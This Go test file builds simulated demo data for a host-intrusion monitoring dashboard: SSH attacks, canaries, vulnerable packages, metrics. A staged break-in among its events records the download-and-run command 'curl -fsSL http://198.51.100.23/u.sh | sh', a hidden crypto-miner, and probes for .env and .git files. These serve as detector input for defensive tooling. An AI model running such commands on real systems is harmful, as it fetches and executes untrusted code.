package server

import (
	"fmt"
	"math"
	"math/rand"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/akquisio-dev/vigil/internal/proto"
)

// TestWriteDemoData fills a data directory with a week of plausible activity
// on three hosts, for screenshots and for working on the dashboard:
//
//	VIGIL_DEMO_DIR=/tmp/vigil-demo go test ./internal/server -run TestWriteDemoData
//
// Addresses come from the documentation ranges (RFC 5737). Add a user with
// `vigil-server user add` afterwards.
func TestWriteDemoData(t *testing.T) {
	dir := os.Getenv("VIGIL_DEMO_DIR")
	if dir == "" {
		t.Skip("set VIGIL_DEMO_DIR to write demo data")
	}
	if _, err := os.Stat(filepath.Join(dir, "state.json")); err == nil {
		t.Fatalf("%s already has data", dir)
	}
	s, err := New(&Config{DataDir: dir, RecentEvents: 200000})
	if err != nil {
		t.Fatal(err)
	}
	rng := rand.New(rand.NewSource(7))
	now := time.Now().UTC()
	start := now.Add(-7 * 24 * time.Hour)

	hosts := []*AgentRec{
		{ID: "demo-web", Name: "web-01", Hostname: "web-01", Version: Version},
		{ID: "demo-app", Name: "app-01", Hostname: "app-01", Version: Version},
		{ID: "demo-db", Name: "db-01", Hostname: "db-01", Version: Version},
	}
	for i, a := range hosts {
		a.Enrolled, a.LastSeen, a.StartedOnce, a.BaselineSet = start, now.Add(-time.Duration(5+i*7)*time.Second), true, true
		a.Ports, a.Baseline = demoPorts(i), map[string]bool{}
		for _, p := range a.Ports {
			a.Baseline[p["key"].(string)] = true
		}
		s.state.Agents[a.ID] = a
	}
	hosts[0].Tags, hosts[1].Tags, hosts[2].Tags = []string{"E", "web"}, []string{"M", "app"}, []string{"M", "db"}
	hosts[2].Silent, hosts[2].LastSeen = true, now.Add(-47*time.Minute)
	hosts[1].Containers = []*Container{
		{ID: "4f1c2a9b0d11", Name: "app-api-1", Image: "registry.example.com/app/api:2.4.1", Project: "app"},
		{ID: "7a2b3c4d5e66", Name: "app-db-1", Image: "postgres:16-alpine", Project: "app"},
		{ID: "9e8d7c6b5a44", Name: "traefik", Image: "traefik:v3.1", Mounts: []ContainerMount{{Source: "/var/run/docker.sock", Dest: "/var/run/docker.sock"}}},
		{ID: "1a2b3c4d5e6f", Name: "node-exporter", Image: "prom/node-exporter:v1.8.2", PidHost: true, Mounts: []ContainerMount{{Source: "/", Dest: "/host"}},
			Risks: []string{"host PID namespace", "host / mounted"}},
	}
	hosts[1].DockerGroup = []string{"deploy"}
	hosts[1].AppVulns = &AppVulnSummary{Checked: now.Add(-2 * time.Hour), Manifests: 3, Packages: 412,
		Counts: map[string]int{"critical": 1, "high": 2, "medium": 3, "unknown": 1},
		Malicious: []AppHit{{ID: "MAL-2026-1001", Ecosystem: "npm", Package: "colors-utils-plus", Installed: "1.0.2", Severity: "critical", Malicious: true,
			Path: "/srv/app/package-lock.json", Summary: "Malicious code in colors-utils-plus (npm)"}},
		Top: []AppHit{
			{ID: "GHSA-r5fr-rjxr-66jc", CVEs: []string{"CVE-2026-4800"}, Ecosystem: "npm", Package: "lodash", Installed: "4.17.21", Fixed: "4.18.0", Severity: "high", Path: "/srv/app/package-lock.json"},
			{ID: "GHSA-xj96-63gp-2gmr", Ecosystem: "PyPI", Package: "pillow", Installed: "11.3.0", Fixed: "12.3.0", Severity: "high", Path: "/srv/worker/requirements.txt"},
			{ID: "GHSA-x5fp-wj9c-mxmx", Ecosystem: "npm", Package: "qs", Installed: "6.15.3", Fixed: "6.16.0", Severity: "medium", Path: "/srv/app/package-lock.json"},
			{ID: "GO-2026-4001", Ecosystem: "Go", Package: "golang.org/x/net", Installed: "v0.38.0", Fixed: "0.45.0", Path: "/srv/api/go.mod"},
		}}
	hosts[0].ResponseTypes = []string{"block_ip", "kill_session", "kill_process", "remove_key"}
	s.state.Canaries["demo-canary"] = &CanaryRec{ID: "demo-canary", AgentID: "demo-app", Type: "env", Path: "/srv/app/.env.backup",
		Created: start, By: "demo", Status: "active"}
	s.state.Canaries["demo-canary-2"] = &CanaryRec{ID: "demo-canary-2", AgentID: "demo-web", Type: "credentials", Path: "/root/zugangsdaten-alt.txt",
		Created: start, By: "demo", Status: "active"}

	s.state.Suppressions = []*Suppression{{ID: "demo-sup", Rule: "ssh.new_source", Agent: "demo-web",
		Match: map[string]string{"user": "deploy", "ip": "192.0.2.80"}, Reason: "CI deploy runner", By: "demo",
		Created: start, Expires: now.Add(23 * 24 * time.Hour)}}

	type ev struct {
		at   time.Time
		host *AgentRec
		typ  string
		data map[string]any
	}
	var evs []ev
	add := func(at time.Time, h *AgentRec, typ string, d map[string]any) { evs = append(evs, ev{at, h, typ, d}) }

	attackers := make([]string, 14)
	for i := range attackers {
		attackers[i] = fmt.Sprintf("%s.%d", []string{"203.0.113", "198.51.100", "192.0.2"}[i%3], 10+rng.Intn(240))
	}
	users := []string{"root", "admin", "ubuntu", "test", "oracle", "postgres", "git", "deploy"}
	for at := start; at.Before(now); at = at.Add(time.Hour) {
		for _, h := range hosts[:2] {
			waves := rng.Intn(4)
			if at.Hour() >= 1 && at.Hour() <= 5 {
				waves += 3
			}
			for w := 0; w < waves; w++ {
				ip := attackers[rng.Intn(len(attackers))]
				if rng.Intn(3) == 0 {
					ip = attackers[0]
				}
				us := []any{users[rng.Intn(len(users))]}
				if rng.Intn(2) == 0 {
					us = append(us, "root")
				}
				n := 2 + rng.Intn(18)
				uc := map[string]any{}
				for i, u := range us {
					c := n / len(us)
					if i == 0 {
						c += n % len(us)
					}
					uc[u.(string)] = float64(c)
				}
				add(at.Add(time.Duration(rng.Intn(3600))*time.Second), h, "ssh.failed", map[string]any{"ip": ip, "count": float64(n), "users": us, "user_counts": uc})
			}
		}
		if at.Hour() == 9 || at.Hour() == 14 {
			h := hosts[rng.Intn(2)]
			add(at.Add(12*time.Minute), h, "ssh.login", map[string]any{"user": "root", "ip": "192.0.2.50", "method": "publickey",
				"fingerprint": "SHA256:demoAliceLaptop", "key_comment": "alice-laptop", "key_file": "/root/.ssh/authorized_keys"})
			add(at.Add(14*time.Minute), h, "sudo.command", map[string]any{"user": "alice", "as": "root", "command": "/usr/bin/systemctl restart nginx"})
		}
		if at.Hour() == 3 {
			add(at.Add(5*time.Minute), hosts[0], "ssh.login", map[string]any{"user": "deploy", "ip": "192.0.2.80", "method": "publickey",
				"fingerprint": "SHA256:demoDeploy", "key_comment": "ci-deploy", "key_file": "/home/deploy/.ssh/authorized_keys"})
		}
	}
	day := func(d, h int) time.Time {
		return start.Truncate(24 * time.Hour).Add(time.Duration(d)*24*time.Hour + time.Duration(h)*time.Hour)
	}
	add(day(1, 11), hosts[0], "ssh.failed", map[string]any{"ip": attackers[0], "count": float64(64), "users": []any{"root", "admin"}})
	add(day(2, 16), hosts[1], "file.changed", map[string]any{"path": "/etc/crontab", "category": "cron"})
	add(day(3, 10), hosts[0], "ssh.key_added", map[string]any{"file": "/root/.ssh/authorized_keys", "comment": "bob-desktop", "fingerprint": "SHA256:demoBob"})
	add(day(4, 13), hosts[1], "port.opened", map[string]any{"proto": "tcp", "port": float64(9200), "addr": "0.0.0.0", "scope": "any", "via": "listen", "process": "java", "key": "listen/tcp/0.0.0.0:9200"})
	add(day(5, 2), hosts[1], "ssh.login", map[string]any{"user": "root", "ip": "198.51.100.23", "method": "password"})
	add(day(5, 2).Add(4*time.Minute), hosts[1], "file.changed", map[string]any{"path": "/etc/systemd/system/update-checker.service", "category": "systemd"})
	add(day(5, 2).Add(6*time.Minute), hosts[1], "canary.opened", map[string]any{"canary_id": "demo-canary", "path": "/srv/app/.env.backup", "exe": "/usr/bin/cat", "uid": "0", "pid": float64(48211)})
	add(day(6, 8), hosts[0], "ssh.login", map[string]any{"user": "root", "ip": "203.0.113.77", "method": "publickey", "fingerprint": "SHA256:demoUnknown"})
	add(day(5, 2).Add(5*time.Minute), hosts[1], "process.exec", map[string]any{"pid": float64(48190), "ppid": float64(48001), "uid": float64(0),
		"exe": "/usr/bin/bash", "comm": "bash", "cmdline": "bash -c curl -fsSL http://198.51.100.23/u.sh | sh", "cwd": "/root",
		"parent_exe": "/usr/sbin/sshd", "parent_comm": "sshd", "signals": []any{"cmd_download_exec"}})
	add(day(5, 2).Add(5*time.Minute+20*time.Second), hosts[1], "process.exec", map[string]any{"pid": float64(48201), "ppid": float64(48190), "uid": float64(0),
		"exe": "/tmp/.x/kworkerd", "comm": "kworkerd", "cmdline": "/tmp/.x/kworkerd -o stratum+tcp://203.0.113.200:3333", "cwd": "/tmp/.x",
		"parent_exe": "/usr/bin/bash", "parent_comm": "bash", "signals": []any{"tmp_exe", "cmd_miner"}})
	add(day(5, 2).Add(5*time.Minute+40*time.Second), hosts[1], "net.connection", map[string]any{"remote_ip": "203.0.113.200",
		"remote_port": float64(3333), "local_port": float64(51234), "process": "kworkerd", "exe": "/tmp/.x/kworkerd", "uid": "0", "private": false})
	for i, ip := range []string{"203.0.113.41", "198.51.100.88", "192.0.2.199"} {
		add(now.Add(-time.Duration(3+i*5)*time.Hour), hosts[0], "web.activity", map[string]any{"log": "/var/log/nginx/access.log", "ip": ip,
			"requests": float64(40 + i*30), "status_2xx": float64(1), "status_4xx": float64(38 + i*30), "probes": float64(12 + i*4),
			"exploit_kinds": []any{"traversal"}, "exploits_ok": float64(0), "shells": float64(0), "logins": float64(0),
			"samples": []any{"GET /.env", "GET /wp-login.php", "GET /.git/config"}, "user_agent": "Mozilla/5.0 zgrab/0.x"})
	}
	for i, h := range hosts[:2] {
		add(now.Add(-time.Duration(2+i)*time.Hour), h, "system.updates", map[string]any{"pending": float64(4 + i*9), "security": float64(i * 3),
			"security_packages": []any{"openssl", "libssl3t64", "linux-image-generic"}[:i*3], "security_oldest_days": float64(i * 9),
			"reboot_required": i == 1, "reboot_days": float64(i * 8), "reboot_packages": []any{"linux-image-6.8.0-147-generic"},
			"kernel_running": "6.8.0-110-generic", "kernel_newest": []string{"6.8.0-110-generic", "6.8.0-147-generic"}[i],
			"unattended_upgrades": true, "lists_age_days": float64(0)})
	}
	add(now.Add(-26*time.Minute), hosts[0], "user.added", map[string]any{"user": "backup", "uid": float64(1003)})
	add(now.Add(-12*time.Minute), hosts[1], "file.changed", map[string]any{"path": "/etc/sudoers.d/90-app", "category": "sudo"})

	// chronological, so the chain and the day files stay in order
	for i := 1; i < len(evs); i++ {
		for j := i; j > 0 && evs[j].at.Before(evs[j-1].at); j-- {
			evs[j], evs[j-1] = evs[j-1], evs[j]
		}
	}
	for _, e := range evs {
		rec := &Record{Time: e.at, Agent: e.host.ID, Source: "agent", Event: proto.Event{Type: e.typ, TS: e.at, Data: e.data}}
		if err := s.store.Append(rec); err != nil {
			t.Fatal(err)
		}
		fresh := s.raise(s.evaluate(e.host, rec), e.host.ID, rec.Seq)
		for _, al := range fresh {
			al.Created, al.Updated = e.at, e.at
		}
		s.correlate(fresh)
	}
	// a few alerts that a person already looked at
	for i, al := range s.state.Alerts {
		if i%3 == 0 && al.Created.Before(now.Add(-24*time.Hour)) {
			ack := al.Created.Add(time.Duration(8+rng.Intn(50)) * time.Minute)
			al.Status, al.By, al.Acked, al.Updated = "acked", "demo", &ack, ack
		}
	}
	s.state.Canaries["demo-canary"].Triggers = 1
	s.state.Canaries["demo-canary"].LastTrigg = day(5, 2).Add(6 * time.Minute)
	demoMetrics(s, hosts, now, rng)
	if err := s.state.Save(dir); err != nil {
		t.Fatal(err)
	}
	t.Logf("%d events, %d alerts in %s", len(evs), len(s.state.Alerts), dir)
}

func demoPorts(host int) []map[string]any {
	sets := [][][4]string{
		{{"tcp", "0.0.0.0", "22", "sshd"}, {"tcp", "0.0.0.0", "80", "nginx"}, {"tcp", "0.0.0.0", "443", "nginx"}, {"tcp", "127.0.0.1", "3000", "node"}, {"udp", "127.0.0.53", "53", "systemd-resolve"}},
		{{"tcp", "0.0.0.0", "22", "sshd"}, {"tcp", "127.0.0.1", "8080", "java"}, {"tcp", "127.0.0.1", "6379", "redis-server"}, {"tcp", "10.90.0.2", "9100", "node_exporter"}, {"udp", "0.0.0.0", "51820", ""}, {"udp", "127.0.0.53", "53", "systemd-resolve"}},
		{{"tcp", "0.0.0.0", "22", "sshd"}, {"tcp", "127.0.0.1", "5432", "postgres"}, {"tcp", "10.90.0.3", "5432", "postgres"}, {"udp", "127.0.0.53", "53", "systemd-resolve"}},
	}
	var out []map[string]any
	for _, p := range sets[host] {
		scope := "any"
		switch {
		case strings.HasPrefix(p[1], "127."):
			scope = "loopback"
		case p[1] != "0.0.0.0":
			scope = "address"
		}
		port, _ := strconv.Atoi(p[2])
		out = append(out, map[string]any{"proto": p[0], "addr": p[1], "port": float64(port), "scope": scope, "via": "listen",
			"process": p[3], "key": fmt.Sprintf("listen/%s/%s:%d", p[0], p[1], port)})
	}
	return out
}

// demoMetrics writes a week of load samples: a daily rhythm, the web host
// running the vigil server, and the three hosts talking over a VPN.
func demoMetrics(s *Server, hosts []*AgentRec, now time.Time, rng *rand.Rand) {
	hosts[0].LastIP = "127.0.0.1"
	hosts[1].LastIP, hosts[2].LastIP = "10.90.0.2", "10.90.0.3"
	type shape struct {
		cpu, mem, net float64
		cores         int
		mem_total     uint64
	}
	shapes := []shape{{18, 55, 900e3, 4, 8 << 30}, {42, 71, 300e3, 8, 16 << 30}, {12, 86, 150e3, 4, 32 << 30}}
	ifs := [][]proto.IfaceRate{
		{{Name: "eth0", Addrs: []string{"192.0.2.10"}}, {Name: "wg0", Addrs: []string{"10.90.0.1"}}},
		{{Name: "eth0", Addrs: []string{"192.0.2.20"}}, {Name: "wg0", Addrs: []string{"10.90.0.2"}}},
		{{Name: "eth0", Addrs: []string{"198.51.100.7"}}, {Name: "wg0", Addrs: []string{"10.90.0.3"}}},
	}
	peers := [][]proto.Peer{
		{{IP: "10.90.0.2", Port: 8080, Out: true, N: 6, Process: "nginx"}, {IP: "10.90.0.2", Port: 8471, N: 1, Process: "vigil-server"}, {IP: "10.90.0.3", Port: 8471, N: 1, Process: "vigil-server"}},
		{{IP: "10.90.0.1", Port: 8080, N: 6, Process: "java"}, {IP: "10.90.0.3", Port: 5432, Out: true, N: 12, Process: "java"}, {IP: "10.90.0.1", Port: 8471, Out: true, N: 1, Process: "vigil-agent"}, {IP: "10.90.0.3", Port: 22, Out: true, N: 1, Process: "ssh"}},
		{{IP: "10.90.0.2", Port: 5432, N: 12, Process: "postgres"}, {IP: "10.90.0.1", Port: 8471, Out: true, N: 1, Process: "vigil-agent"}},
	}
	tops := [][]proto.ProcLoad{
		{{PID: 812, Comm: "nginx", Exe: "/usr/sbin/nginx", CPU: 6.2, RSS: 96 << 20}, {PID: 1201, Comm: "node", Exe: "/usr/bin/node", CPU: 11.8, RSS: 610 << 20}, {PID: 640, Comm: "vigil-server", Exe: "/usr/local/bin/vigil-server", CPU: 0.4, RSS: 88 << 20}},
		{{PID: 2210, Comm: "java", Exe: "/usr/lib/jvm/java-21/bin/java", CPU: 88.5, RSS: 5 << 30}, {PID: 990, Comm: "redis-server", Exe: "/usr/bin/redis-server", CPU: 2.1, RSS: 410 << 20}},
		{{PID: 1500, Comm: "postgres", Exe: "/usr/lib/postgresql/16/bin/postgres", CPU: 14.0, RSS: 21 << 30}},
	}
	s.metrics.hosts = map[string]*hostMetrics{}
	for i, a := range hosts {
		hm := &hostMetrics{}
		sh := shapes[i]
		end := a.LastSeen
		for ts := now.Add(-7 * 24 * time.Hour); !ts.After(end); ts = ts.Add(time.Minute) {
			hour := float64(ts.Hour()) + float64(ts.Minute())/60
			wave := 0.6 + 0.4*math.Sin((hour-9)/24*2*math.Pi)
			cpu := math.Min(100, sh.cpu*wave*(0.8+0.4*rng.Float64())+rng.Float64()*3)
			if i == 1 && ts.Hour() == 3 && ts.Minute() < 20 {
				cpu = 92 + rng.Float64()*6 // the nightly batch job
			}
			memPct := sh.mem + 4*math.Sin(float64(ts.Unix())/86400) + rng.Float64()
			m := proto.Metrics{TS: ts, Cores: sh.cores, CPU: cpu, IOWait: cpu * 0.05 * rng.Float64(), Steal: rng.Float64() * 0.8,
				Load:     [3]float64{cpu / 100 * float64(sh.cores), cpu / 110 * float64(sh.cores), cpu / 120 * float64(sh.cores)},
				MemTotal: sh.mem_total, MemUsed: uint64(float64(sh.mem_total) * memPct / 100), MemCache: sh.mem_total / 5,
				SwapTotal: 2 << 30, SwapUsed: uint64(rng.Float64() * float64(200<<20)),
				RX: sh.net * wave * (0.7 + 0.6*rng.Float64()), TX: sh.net * 0.6 * wave * (0.7 + 0.6*rng.Float64()),
				DiskRead: 2e6 * wave * rng.Float64(), DiskWrite: 4e6 * wave * rng.Float64(), DiskPct: []float64{41, 63, 78}[i],
				Procs: 180 + 40*i, Uptime: int64(ts.Sub(now.Add(-30 * 24 * time.Hour)).Seconds()),
				ConnIn: []int{140, 9, 13}[i] + rng.Intn(20), ConnOut: []int{8, 15, 2}[i]}
			hm.add(m)
		}
		last := *hm.Last
		last.Ifaces = ifs[i]
		for j := range last.Ifaces {
			last.Ifaces[j].RX, last.Ifaces[j].TX = last.RX*(0.8-0.6*float64(j)), last.TX*(0.8-0.6*float64(j))
		}
		last.Disks = []proto.DiskUse{{Mount: "/", FS: "ext4", Total: 160 << 30, Used: uint64(float64(160<<30) * last.DiskPct / 100)}, {Mount: "/boot", FS: "ext4", Total: 1 << 30, Used: 300 << 20}}
		last.Top, last.Peers = tops[i], peers[i]
		hm.Latest, hm.Last = &last, &last
		s.metrics.hosts[a.ID] = hm
	}
	s.metrics.dirty = true
	s.saveMetrics(true)
}
